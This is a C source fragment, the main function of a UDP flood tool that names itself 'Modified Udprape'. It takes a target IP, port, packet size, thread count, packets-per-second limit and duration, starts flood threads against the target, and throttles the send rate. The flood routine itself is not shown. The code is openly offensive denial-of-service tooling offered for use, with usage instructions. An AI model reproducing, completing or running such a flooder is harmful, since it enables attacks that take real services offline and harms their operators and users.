int main(int argc, char *argv[ ])
{
        if(argc < 5){
                fprintf(stderr, "Invalid parameters! Modified Udprape\n");
                fprintf(stdout, "Usage: %s <target IP> <port> <packet_size (use something higher than 501, 100 works sometimes> <number threads to use> <pps limiter, 100k to 200k> <time> \n", argv[0]);
                exit(-1);
        }

        fprintf(stdout, "Setting up Sockets...\n");

        int num_threads = atoi(argv[4]);
        int maxpps = atoi(argv[5]);
		
        floodport = atoi(argv[2]);
        packet_size = atoi(argv[3]);

        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads];

        int multiplier = 20;
        

        int i;
        for(i = 0;i<num_threads;i++){
                pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        }
        fprintf(stdout, "Starting Flood...\n");
        for(i = 0;i<(atoi(argv[6])*multiplier);i++)
        {
                usleep((1000/multiplier)*1000);
                if((pps*multiplier) > maxpps)
                {
                        if(1 > limiter)
                        {
                                sleeptime+=100;
                        } else {
                                limiter--;
                        }
                } else {
                        limiter++;
                        if(sleeptime > 25)
                        {
                                sleeptime-=25;
                        } else {
                                sleeptime = 0;
                        }
                }
                pps = 0;
        }

        return 0;
}